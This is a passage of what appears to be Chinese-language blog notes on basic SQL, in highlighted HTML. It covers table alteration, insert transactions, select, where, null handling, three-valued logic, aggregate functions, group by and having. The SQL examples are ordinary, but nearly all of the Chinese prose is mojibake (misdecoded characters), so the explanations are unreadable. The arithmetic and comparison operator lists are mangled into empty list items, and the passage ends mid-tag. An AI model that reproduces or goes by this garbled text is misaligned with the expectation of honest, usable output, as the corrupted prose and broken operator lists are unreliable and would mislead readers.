class="hljs-built_in">table</span> <span class="hljs-variable">&lt;è¡¨å&gt;</span> <span class="hljs-keyword">drop</span> column <span class="hljs-variable">&lt;åˆ—å&gt;</span>;<br></code></pre></td></tr></table></figure><p><code>alter table</code> æ‰§è¡Œåä¹Ÿæ— æ³•æ¢å¤ã€‚</p><h3 id="å‘Productè¡¨ä¸­æ’å…¥æ•°æ®"><a href="#å‘Productè¡¨ä¸­æ’å…¥æ•°æ®" class="headerlink" title="å‘Productè¡¨ä¸­æ’å…¥æ•°æ®"></a>å‘Productè¡¨ä¸­æ’å…¥æ•°æ®</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">begin</span> <span class="hljs-keyword">transaction</span>;<br><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> &lt;è¡¨å&gt; <span class="hljs-keyword">values</span> ();<br><br><span class="hljs-keyword">commit</span>;<br></code></pre></td></tr></table></figure><h3 id="è¡¨çš„ä¿®æ”¹"><a href="#è¡¨çš„ä¿®æ”¹" class="headerlink" title="è¡¨çš„ä¿®æ”¹"></a>è¡¨çš„ä¿®æ”¹</h3><p>ä¿®æ”¹è¡¨åï¼Œä¸åŒæ•°æ®åº“æŒ‡ä»¤ä¸åŒ:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> &lt;originalname&gt; <span class="hljs-keyword">rename</span> <span class="hljs-keyword">to</span> &lt;<span class="hljs-type">name</span>&gt;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬2ç« -æŸ¥è¯¢åŸºç¡€"><a href="#ç¬¬2ç« -æŸ¥è¯¢åŸºç¡€" class="headerlink" title="ç¬¬2ç«  æŸ¥è¯¢åŸºç¡€"></a>ç¬¬2ç«  æŸ¥è¯¢åŸºç¡€</h1><p>æŸ¥è¯¢æ—¶å¯ä»¥æŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ªæŸ¥è¯¢æ¡ä»¶ã€‚</p><h2 id="2-1-select-è¯­å¥åŸºç¡€"><a href="#2-1-select-è¯­å¥åŸºç¡€" class="headerlink" title="2-1 select è¯­å¥åŸºç¡€"></a>2-1 select è¯­å¥åŸºç¡€</h2><h3 id="åˆ—çš„æŸ¥è¯¢"><a href="#åˆ—çš„æŸ¥è¯¢" class="headerlink" title="åˆ—çš„æŸ¥è¯¢"></a>åˆ—çš„æŸ¥è¯¢</h3><p>é€šè¿‡ select è¯­å¥æŸ¥è¯¢å¹¶é€‰å–å‡ºå¿…è¦æ•°æ®çš„è¿‡ç¨‹ç§°ä¸º<mark>åŒ¹é…æŸ¥è¯¢</mark>æˆ–æŸ¥è¯¢(query).</p><p>åŸºæœ¬è¯­æ³•:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">select</span> &lt;column <span class="hljs-built_in">name</span>&gt;, ...<br>  <span class="hljs-keyword">from</span> &lt;table <span class="hljs-built_in">name</span>&gt;;<br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> product_id, product_name, purchase_price<br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢å¤šåˆ—æ—¶ï¼Œéœ€è¦é€—å·åˆ†éš”ã€‚</p><h3 id="æŸ¥è¯¢å‡ºè¡¨ä¸­æ‰€æœ‰åˆ—"><a href="#æŸ¥è¯¢å‡ºè¡¨ä¸­æ‰€æœ‰åˆ—" class="headerlink" title="æŸ¥è¯¢å‡ºè¡¨ä¸­æ‰€æœ‰åˆ—"></a>æŸ¥è¯¢å‡ºè¡¨ä¸­æ‰€æœ‰åˆ—</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> *<br>  <span class="hljs-keyword">from</span> &lt;tablename&gt;;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>*</code> æ— æ³•è®¾å®šåˆ—çš„æ˜¾ç¤ºé¡ºåºã€‚</p><p>SQL è¯­å¥å¯ä»¥éšæ„ä½¿ç”¨æ¢è¡Œç¬¦ã€‚</p><h3 id="ä¸ºåˆ—è®¾å®šåˆ«å"><a href="#ä¸ºåˆ—è®¾å®šåˆ«å" class="headerlink" title="ä¸ºåˆ—è®¾å®šåˆ«å"></a>ä¸ºåˆ—è®¾å®šåˆ«å</h3><p>ä½¿ç”¨<code>as</code>å…³é”®è¯ã€‚</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">select product_id <span class="hljs-keyword">as</span> <span class="hljs-built_in">id</span><br>  <span class="hljs-keyword">from</span> Product<br></code></pre></td></tr></table></figure><p>åˆ«åè‹¥è¦ä½¿ç”¨ä¸­æ–‡éœ€è¦ç”¨åŒå¼•å·(â€œ)æ‹¬èµ·æ¥ã€‚</p><h3 id="å¸¸æ•°çš„æŸ¥è¯¢"><a href="#å¸¸æ•°çš„æŸ¥è¯¢" class="headerlink" title="å¸¸æ•°çš„æŸ¥è¯¢"></a>å¸¸æ•°çš„æŸ¥è¯¢</h3><h3 id="ä»ç»“æœä¸­åˆ é™¤é‡å¤è¡Œ"><a href="#ä»ç»“æœä¸­åˆ é™¤é‡å¤è¡Œ" class="headerlink" title="ä»ç»“æœä¸­åˆ é™¤é‡å¤è¡Œ"></a>ä»ç»“æœä¸­åˆ é™¤é‡å¤è¡Œ</h3><p>é€šè¿‡ select å­å¥ä¸­ä½¿ç”¨ distinct:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> product_type<br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ distinct æ—¶ï¼Œnull ä¹Ÿè¢«è§†ä¸ºä¸€ç±»æ•°æ®ã€‚</p><h3 id="æ ¹æ®-where-è¯­å¥æ¥é€‰æ‹©è®°å½•"><a href="#æ ¹æ®-where-è¯­å¥æ¥é€‰æ‹©è®°å½•" class="headerlink" title="æ ¹æ® where è¯­å¥æ¥é€‰æ‹©è®°å½•"></a>æ ¹æ® where è¯­å¥æ¥é€‰æ‹©è®°å½•</h3><p>select è¯­å¥é€šè¿‡ where å­å¥æ¥æŒ‡å®šæŸ¥è¯¢æ•°æ®çš„æ¡ä»¶ã€‚</p><p>è¯­æ³•:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name<span class="hljs-operator">&gt;</span>, ...<br> <span class="hljs-keyword">from</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">table</span> name<span class="hljs-operator">&gt;</span> <br> <span class="hljs-keyword">where</span> <span class="hljs-operator">&lt;</span>expr<span class="hljs-operator">&gt;</span>;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡ where å­å¥æŸ¥è¯¢å‡ºç¬¦åˆæŒ‡å®šæ¡ä»¶çš„è®°å½•ï¼Œç„¶åå†é€‰å–å‡º select è¯­å¥æŒ‡å®šçš„åˆ—ã€‚</p><p>SQL ä¸­å­å¥çš„ä¹¦å†™é¡ºåºæ˜¯å›ºå®šçš„ï¼Œwhere å­å¥å¿…é¡»ç´§è·Ÿåœ¨ from å­å¥ä¹‹åã€‚</p><h3 id="æ³¨é‡Šçš„ä¹¦å†™æ–¹æ³•"><a href="#æ³¨é‡Šçš„ä¹¦å†™æ–¹æ³•" class="headerlink" title="æ³¨é‡Šçš„ä¹¦å†™æ–¹æ³•"></a>æ³¨é‡Šçš„ä¹¦å†™æ–¹æ³•</h3><p>ä¸¤ç§:</p><ul><li>1è¡Œæ³¨é‡Šï¼Œç”¨<code>--</code></li><li>å¤šè¡Œæ³¨é‡Šï¼Œç”¨<code>/*</code> å’Œ <code>*/</code></li></ul><h2 id="2-2-ç®—æœ¯è¿ç®—ç¬¦å’Œæ¯”è¾ƒè¿ç®—ç¬¦"><a href="#2-2-ç®—æœ¯è¿ç®—ç¬¦å’Œæ¯”è¾ƒè¿ç®—ç¬¦" class="headerlink" title="2-2 ç®—æœ¯è¿ç®—ç¬¦å’Œæ¯”è¾ƒè¿ç®—ç¬¦"></a>2-2 ç®—æœ¯è¿ç®—ç¬¦å’Œæ¯”è¾ƒè¿ç®—ç¬¦</h2><h3 id="ç®—æœ¯è¿ç®—ç¬¦"><a href="#ç®—æœ¯è¿ç®—ç¬¦" class="headerlink" title="ç®—æœ¯è¿ç®—ç¬¦"></a>ç®—æœ¯è¿ç®—ç¬¦</h3><p>å¦‚:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> product_name, sale_price,<br>       sale_price * <span class="hljs-number">2</span> <span class="hljs-keyword">as</span> <span class="hljs-string">&quot;sale_price_x2&quot;</span><br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><p>å››åˆ™è¿ç®—ç¬¦å·:</p><ul><li><ul><li></li></ul></li><li><ul><li></li></ul></li><li><ul><li></li></ul></li><li>&#x2F;</li></ul><h3 id="éœ€è¦æ³¨æ„NULL"><a href="#éœ€è¦æ³¨æ„NULL" class="headerlink" title="éœ€è¦æ³¨æ„NULL"></a>éœ€è¦æ³¨æ„NULL</h3><p>æ‰€æœ‰åŒ…å« null çš„è®¡ç®—ï¼Œç»“æœè‚¯å®šæ˜¯ null.</p><h3 id="æ¯”è¾ƒè¿ç®—ç¬¦"><a href="#æ¯”è¾ƒè¿ç®—ç¬¦" class="headerlink" title="æ¯”è¾ƒè¿ç®—ç¬¦"></a>æ¯”è¾ƒè¿ç®—ç¬¦</h3><p>ä½¿ç”¨ <code>=</code> .</p><p>â€œä¸ç­‰äºâ€æ¯”è¾ƒè¿ç®—ç¬¦<code>&lt;&gt;</code>.</p><p>å…¶ä»–æ¯”è¾ƒè¿ç®—ç¬¦:</p><ul><li><blockquote><p>&#x3D;</p></blockquote></li><li><blockquote></blockquote></li><li>&lt;&#x3D;</li><li>&lt;</li></ul><h3 id="å¯¹å­—ç¬¦ä¸²ä½¿ç”¨ä¸ç­‰å·æ—¶çš„æ³¨æ„äº‹é¡¹"><a href="#å¯¹å­—ç¬¦ä¸²ä½¿ç”¨ä¸ç­‰å·æ—¶çš„æ³¨æ„äº‹é¡¹" class="headerlink" title="å¯¹å­—ç¬¦ä¸²ä½¿ç”¨ä¸ç­‰å·æ—¶çš„æ³¨æ„äº‹é¡¹"></a>å¯¹å­—ç¬¦ä¸²ä½¿ç”¨ä¸ç­‰å·æ—¶çš„æ³¨æ„äº‹é¡¹</h3><p>åœ¨å¯¹å­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®è¿›è¡Œå¤§å°æ¯”è¾ƒæ—¶ï¼Œä½¿ç”¨çš„æ˜¯å’Œæ•°å­—æ¯”è¾ƒä¸åŒçš„è§„åˆ™ã€‚</p><p>æŒ‰ç…§å­—å…¸é¡ºåºè¿›è¡Œæ¯”è¾ƒã€‚ä»¥ç›¸åŒå­—ç¬¦å¼€å¤´çš„å•è¯æ¯”ä¸åŒå­—ç¬¦å¼€å¤´çš„å•è¯æ›´æ¥è¿‘ã€‚</p><h3 id="ä¸èƒ½å¯¹nullä½¿ç”¨æ¯”è¾ƒè¿ç®—ç¬¦"><a href="#ä¸èƒ½å¯¹nullä½¿ç”¨æ¯”è¾ƒè¿ç®—ç¬¦" class="headerlink" title="ä¸èƒ½å¯¹nullä½¿ç”¨æ¯”è¾ƒè¿ç®—ç¬¦"></a>ä¸èƒ½å¯¹nullä½¿ç”¨æ¯”è¾ƒè¿ç®—ç¬¦</h3><p>SQL æä¾›äº†ä¸“é—¨ç”¨æ¥åˆ¤æ–­æ˜¯å¦ä¸º null çš„ <code>is null</code> è¿ç®—ç¬¦ã€‚</p><p>å¦‚:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> product_name, purchase_price<br>    <span class="hljs-keyword">from</span> Product<br>  <span class="hljs-keyword">where</span> purchase_price <span class="hljs-keyword">is</span> <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p>è‹¥ä¸æ˜¯ null, ç”¨ <code>is not null</code> è¿ç®—ç¬¦ã€‚</p><h2 id="2-3-é€»è¾‘è¿ç®—ç¬¦"><a href="#2-3-é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="2-3 é€»è¾‘è¿ç®—ç¬¦"></a>2-3 é€»è¾‘è¿ç®—ç¬¦</h2><h3 id="not-è¿ç®—ç¬¦"><a href="#not-è¿ç®—ç¬¦" class="headerlink" title="not è¿ç®—ç¬¦"></a>not è¿ç®—ç¬¦</h3><p>éœ€è¦å’Œå…¶ä»–æŸ¥è¯¢æ¡ä»¶ç»„åˆä½¿ç”¨ã€‚</p><h3 id="and-è¿ç®—ç¬¦å’Œ-or-è¿ç®—ç¬¦"><a href="#and-è¿ç®—ç¬¦å’Œ-or-è¿ç®—ç¬¦" class="headerlink" title="and è¿ç®—ç¬¦å’Œ or è¿ç®—ç¬¦"></a>and è¿ç®—ç¬¦å’Œ or è¿ç®—ç¬¦</h3><p><code>and</code> è¿ç®—ç¬¦æ˜¯â€œä¸â€è¿ç®—ã€‚</p><p><code>or</code> è¿ç®—ç¬¦æ˜¯â€æˆ–â€è¿ç®—ã€‚</p><h3 id="é€šè¿‡æ‹¬å·å¼ºåŒ–å¤„ç†"><a href="#é€šè¿‡æ‹¬å·å¼ºåŒ–å¤„ç†" class="headerlink" title="é€šè¿‡æ‹¬å·å¼ºåŒ–å¤„ç†"></a>é€šè¿‡æ‹¬å·å¼ºåŒ–å¤„ç†</h3><p><code>and</code> è¿ç®—ç¬¦ä¼˜å…ˆäº <code>or</code> è¿ç®—ç¬¦ã€‚</p><p>æ—¥æœŸçš„ä¸€ç§æ ¼å¼ <code>2009-09-11</code>.</p><h3 id="é€»è¾‘è¿ç®—ç¬¦å’ŒçœŸå€¼"><a href="#é€»è¾‘è¿ç®—ç¬¦å’ŒçœŸå€¼" class="headerlink" title="é€»è¾‘è¿ç®—ç¬¦å’ŒçœŸå€¼"></a>é€»è¾‘è¿ç®—ç¬¦å’ŒçœŸå€¼</h3><p>æ¯”è¾ƒè¿ç®—ç¬¦ä¼šæŠŠè¿ç®—ç»“æœä»¥çœŸå€¼çš„å½¢å¼è¿”å›ã€‚</p><p>ä½¿ç”¨ <code>and</code> è¿ç®—ç¬¦è¿›è¡Œçš„é€»è¾‘è¿ç®—ç§°ä¸º<mark>é€»è¾‘ç§¯</mark>.</p><p>ä½¿ç”¨ <code>or</code> è¿ç®—ç¬¦è¿›è¡Œçš„é€»è¾‘è¿ç®—ç§°ä¸º<mark>é€»è¾‘å’Œ</mark>.</p><p>ä¸èƒ½å¯¹ null ä½¿ç”¨æ¯”è¾ƒè¿ç®—ç¬¦ã€‚</p><h3 id="å«æœ‰-null-æ—¶çš„çœŸå€¼"><a href="#å«æœ‰-null-æ—¶çš„çœŸå€¼" class="headerlink" title="å«æœ‰ null æ—¶çš„çœŸå€¼"></a>å«æœ‰ null æ—¶çš„çœŸå€¼</h3><p>çœŸå€¼ä¸­é™¤çœŸå‡ä¹‹å¤–çš„ç¬¬ä¸‰ç§å€¼â€“ä¸ç¡®å®š(unknown).</p><p>ä¸é€šå¸¸çš„é€»è¾‘è¿ç®—è¢«ç§°ä¸º<mark>äºŒå€¼é€»è¾‘</mark>. </p><p>SQL ä¸­çš„é€»è¾‘è¿ç®—è¢«ç§°ä¸º<mark>ä¸‰å€¼é€»è¾‘</mark>.</p><p>çº§åˆ«: å‡ &gt; ä¸ç¡®å®š &gt; çœŸ.</p><p>å°½é‡ä¸ä½¿ç”¨ null, å…¶ä¼šä½¿çœŸå€¼è¡¨æ›´å¤æ‚ã€‚</p><h1 id="ç¬¬3ç« -èšåˆä¸æ’åº"><a href="#ç¬¬3ç« -èšåˆä¸æ’åº" class="headerlink" title="ç¬¬3ç«  èšåˆä¸æ’åº"></a>ç¬¬3ç«  èšåˆä¸æ’åº</h1><h2 id="3-1-å¯¹è¡¨è¿›è¡ŒèšåˆæŸ¥è¯¢"><a href="#3-1-å¯¹è¡¨è¿›è¡ŒèšåˆæŸ¥è¯¢" class="headerlink" title="3-1 å¯¹è¡¨è¿›è¡ŒèšåˆæŸ¥è¯¢"></a>3-1 å¯¹è¡¨è¿›è¡ŒèšåˆæŸ¥è¯¢</h2><h3 id="èšåˆå‡½æ•°"><a href="#èšåˆå‡½æ•°" class="headerlink" title="èšåˆå‡½æ•°"></a>èšåˆå‡½æ•°</h3><p>SQLä¸­ç”¨äºæ±‡æ€»çš„å‡½æ•°:</p><ul><li>count: è®¡ç®—è¡Œæ•°</li><li>sum: åˆ—æ•°æ®çš„åˆè®¡å€¼</li><li>avg: åˆ—æ•°æ®çš„å¹³å‡å€¼</li><li>max: åˆ—æ•°æ®çš„æœ€å¤§å€¼</li><li>min: åˆ—æ•°æ®çš„æœ€å°å€¼<br>ç”¨äºæ±‡æ€»çš„å‡½æ•°ç§°ä¸º<mark>èšåˆå‡½æ•°</mark>æˆ–è€…<mark>èšé›†å‡½æ•°</mark>.</li></ul><p>æ‰€è°“<mark>èšåˆ</mark>, å°±æ˜¯å°†å¤šè¡Œæ±‡æ€»äºä¸€è¡Œ.</p><h3 id="è®¡ç®—è¡¨ä¸­æ•°æ®çš„è¡Œæ•°"><a href="#è®¡ç®—è¡¨ä¸­æ•°æ®çš„è¡Œæ•°" class="headerlink" title="è®¡ç®—è¡¨ä¸­æ•°æ®çš„è¡Œæ•°"></a>è®¡ç®—è¡¨ä¸­æ•°æ®çš„è¡Œæ•°</h3><p>è®¡ç®—å…¨éƒ¨æ•°æ®çš„è¡Œæ•°:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*)<br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><h3 id="è®¡ç®—-null-ä¹‹å¤–çš„æ•°æ®çš„è¡Œæ•°"><a href="#è®¡ç®—-null-ä¹‹å¤–çš„æ•°æ®çš„è¡Œæ•°" class="headerlink" title="è®¡ç®— null ä¹‹å¤–çš„æ•°æ®çš„è¡Œæ•°"></a>è®¡ç®— null ä¹‹å¤–çš„æ•°æ®çš„è¡Œæ•°</h3><p>å°†å¯¹è±¡åˆ—è®¾å®šä¸ºå‚æ•°è€Œä¸æ˜¯ <code>*</code>.</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(purchase_price)<br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æ˜Ÿå·æ˜¯<code>count</code>å‡½æ•°ç‰¹æœ‰çš„ï¼Œå…¶ä»–å‡½æ•°ä¸èƒ½å°†å…¶ä½œä¸ºå‚æ•°ã€‚</p><h3 id="è®¡ç®—åˆè®¡å€¼"><a href="#è®¡ç®—åˆè®¡å€¼" class="headerlink" title="è®¡ç®—åˆè®¡å€¼"></a>è®¡ç®—åˆè®¡å€¼</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-keyword">sum</span>(sale_price)<br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><p>æ‰€æœ‰çš„èšåˆå‡½æ•°ï¼Œå¦‚æœä»¥åˆ—åä¸ºå‚æ•°ï¼Œé‚£ä¹ˆåœ¨è®¡ç®—ä¹‹å‰å°±å·²ç»æŠŠ null æ’é™¤åœ¨å¤–äº†ï¼Œå› æ­¤æ— è®ºæœ‰å¤šå°‘ä¸ª null éƒ½ä¼šè¢«æ— è§†ã€‚</p><h3 id="è®¡ç®—å¹³å‡å€¼"><a href="#è®¡ç®—å¹³å‡å€¼" class="headerlink" title="è®¡ç®—å¹³å‡å€¼"></a>è®¡ç®—å¹³å‡å€¼</h3><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-keyword">avg</span>(sale_price)<br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><h3 id="è®¡ç®—æœ€å¤§å€¼å’Œæœ€å°å€¼"><a href="#è®¡ç®—æœ€å¤§å€¼å’Œæœ€å°å€¼" class="headerlink" title="è®¡ç®—æœ€å¤§å€¼å’Œæœ€å°å€¼"></a>è®¡ç®—æœ€å¤§å€¼å’Œæœ€å°å€¼</h3><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">select</span> <span class="hljs-built_in">max</span>(sale_price), <span class="hljs-built_in">min</span>(purchase_price)<br>  from <span class="hljs-built_in">Product</span>;<br></code></pre></td></tr></table></figure><p>max&#x2F;min å‡½æ•°åŸåˆ™ä¸Šå¯ä»¥é€‚ç”¨äºä»»ä½•æ•°æ®ç±»å‹çš„åˆ—ã€‚</p><p>sum&#x2F;avg å‡½æ•°åªé€‚ç”¨äºæ•°å€¼ç±»å‹ã€‚</p><h3 id="ä½¿ç”¨èšåˆå‡½æ•°åˆ é™¤é‡å¤å€¼-å…³é”®å­—distinct"><a href="#ä½¿ç”¨èšåˆå‡½æ•°åˆ é™¤é‡å¤å€¼-å…³é”®å­—distinct" class="headerlink" title="ä½¿ç”¨èšåˆå‡½æ•°åˆ é™¤é‡å¤å€¼(å…³é”®å­—distinct)"></a>ä½¿ç”¨èšåˆå‡½æ•°åˆ é™¤é‡å¤å€¼(å…³é”®å­—distinct)</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-keyword">distinct</span> product_type)<br>  <span class="hljs-keyword">from</span> Product;<br></code></pre></td></tr></table></figure><p>åœ¨å‚æ•°ä¸­ä½¿ç”¨ distinct. æ‰€æœ‰çš„èšåˆå‡½æ•°éƒ½å¯ä»¥ä½¿ç”¨ã€‚</p><h2 id="3-2-å¯¹è¡¨è¿›è¡Œåˆ†ç»„"><a href="#3-2-å¯¹è¡¨è¿›è¡Œåˆ†ç»„" class="headerlink" title="3-2 å¯¹è¡¨è¿›è¡Œåˆ†ç»„"></a>3-2 å¯¹è¡¨è¿›è¡Œåˆ†ç»„</h2><p>è¯­æ³•ç»“æ„:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name1<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name2<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name3<span class="hljs-operator">&gt;</span>, ......<br>    <span class="hljs-keyword">from</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">table</span> name<span class="hljs-operator">&gt;</span><br>  <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name1<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name2<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name3<span class="hljs-operator">&gt;</span>, ......;<br></code></pre></td></tr></table></figure><p><code>group by</code> å­å¥ä¸­æŒ‡å®šçš„åˆ—ç§°ä¸º <mark>èšåˆé”®</mark>æˆ–è€…<mark>åˆ†ç»„åˆ—</mark>.</p><p><code>group by</code> å­å¥åº”å†™åœ¨ <code>from</code> è¯­å¥ä¹‹åï¼Œæœ‰ <code>where</code> è¯­å¥ä¹Ÿåº”è¯¥åœ¨ <code>where</code> è¯­å¥ä¹‹å.</p><h3 id="èšåˆé”®ä¸­åŒ…å«-null-çš„æƒ…å†µ"><a href="#èšåˆé”®ä¸­åŒ…å«-null-çš„æƒ…å†µ" class="headerlink" title="èšåˆé”®ä¸­åŒ…å« null çš„æƒ…å†µ"></a>èšåˆé”®ä¸­åŒ…å« null çš„æƒ…å†µ</h3><p>åœ¨ç»“æœä¸­ä»¥ç©ºè¡Œçš„å½¢å¼è¡¨ç°å‡ºæ¥ã€‚</p><h3 id="ä½¿ç”¨-where-å­å¥æ—¶-group-by-çš„æ‰§è¡Œç»“æœ"><a href="#ä½¿ç”¨-where-å­å¥æ—¶-group-by-çš„æ‰§è¡Œç»“æœ" class="headerlink" title="ä½¿ç”¨ where å­å¥æ—¶ group by çš„æ‰§è¡Œç»“æœ"></a>ä½¿ç”¨ where å­å¥æ—¶ group by çš„æ‰§è¡Œç»“æœ</h3><h3 id="ä¸èšåˆå‡½æ•°å’Œ-group-by-å­å¥æœ‰å…³çš„å¸¸è§é”™è¯¯"><a href="#ä¸èšåˆå‡½æ•°å’Œ-group-by-å­å¥æœ‰å…³çš„å¸¸è§é”™è¯¯" class="headerlink" title="ä¸èšåˆå‡½æ•°å’Œ group by å­å¥æœ‰å…³çš„å¸¸è§é”™è¯¯"></a>ä¸èšåˆå‡½æ•°å’Œ group by å­å¥æœ‰å…³çš„å¸¸è§é”™è¯¯</h3><p>ä½¿ç”¨èšåˆå‡½æ•°æ—¶ï¼Œselect å­å¥ä¸­åªèƒ½å­˜åœ¨ä»¥ä¸‹ä¸‰ç§å…ƒç´ :</p><ul><li>å¸¸æ•°</li><li>èšåˆå‡½æ•°</li><li>group by å­å¥ä¸­æŒ‡å®šçš„åˆ—å<br>ä½¿ç”¨ group by å­å¥æ—¶ï¼Œselect å­å¥ä¸­ä¸èƒ½å‡ºç°èšåˆé”®ä¹‹å¤–çš„åˆ«å.</li></ul><p><code>group by</code> å­å¥ä¹Ÿä¸èƒ½ä½¿ç”¨åˆ«åã€‚</p><p><code>group by</code> å­å¥ç»“æœçš„æ˜¾ç¤ºæ˜¯æ— åºçš„ã€‚</p><p>åœ¨ <code>where</code> å­å¥ä¸­ä¸èƒ½ä½¿ç”¨èšåˆå‡½æ•°ã€‚åªæœ‰ <code>select</code> å­å¥å’Œ <code>having</code> å­å¥(ä»¥åŠorder byå­å¥) ä¸­èƒ½å¤Ÿä½¿ç”¨èšåˆå‡½æ•°ã€‚ </p><p><code>distinct</code> å’Œ <code>group by</code> éƒ½èƒ½å¤Ÿåˆ é™¤é‡å¤æ•°æ®ã€‚</p><h2 id="3-3-ä¸ºèšåˆç»“æœæŒ‡å®šæ¡ä»¶"><a href="#3-3-ä¸ºèšåˆç»“æœæŒ‡å®šæ¡ä»¶" class="headerlink" title="3-3 ä¸ºèšåˆç»“æœæŒ‡å®šæ¡ä»¶"></a>3-3 ä¸ºèšåˆç»“æœæŒ‡å®šæ¡ä»¶</h2><h3 id="having-å­å¥"><a href="#having-å­å¥" class="headerlink" title="having å­å¥"></a>having å­å¥</h3><p><code>where</code> åªèƒ½æŒ‡å®šè®°å½•(è¡Œ)çš„æ¡ä»¶ï¼Œè€Œä¸èƒ½ç”¨æ¥æŒ‡å®šç»„çš„æ¡ä»¶.</p><p><code>having</code> å­å¥ç”¨äºæŒ‡å®šé›†åˆçš„æ¡ä»¶ã€‚</p><p>è¯­æ³•:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name1<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name2<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name3<span class="hljs-operator">&gt;</span>, ......<br>  <span class="hljs-keyword">from</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">table</span> name<span class="hljs-operator">&gt;</span><br>  <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name1<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name2<span 